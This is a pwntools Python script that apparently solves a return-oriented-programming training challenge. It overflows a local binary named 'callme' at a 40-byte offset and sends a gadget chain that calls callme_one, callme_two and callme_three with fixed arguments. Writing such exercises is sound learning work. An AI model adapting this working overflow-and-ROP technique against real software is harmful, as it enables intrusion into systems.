#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'callme')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

pop_all = 0x000000000040093c

pop_rdi = 0x00000000004009a3
pop_rsi_r15 = 0x00000000004009a1
pop_rdx = 0x000000000040093e

io.sendline(flat({
    40: [
        pop_rdi,
        0xdeadbeefdeadbeef,

        pop_rsi_r15,
        0xcafebabecafebabe,
        0x0,

        pop_rdx,
        0xd00df00dd00df00d,

        exe.plt['callme_one'], # same as exe.sym['callme_one']

        pop_rdi,
        0xdeadbeefdeadbeef,

        pop_rsi_r15,
        0xcafebabecafebabe,
        0x0,

        pop_rdx,
        0xd00df00dd00df00d,

        exe.plt['callme_two'], # same as exe.sym['callme_two']

        pop_rdi,
        0xdeadbeefdeadbeef,

        pop_rsi_r15,
        0xcafebabecafebabe,
        0x0,

        pop_rdx,
        0xd00df00dd00df00d,

        exe.plt['callme_three'], # same as exe.sym['callme_three']

    ],
}))

#io.sendline(flat({}))

io.interactive()

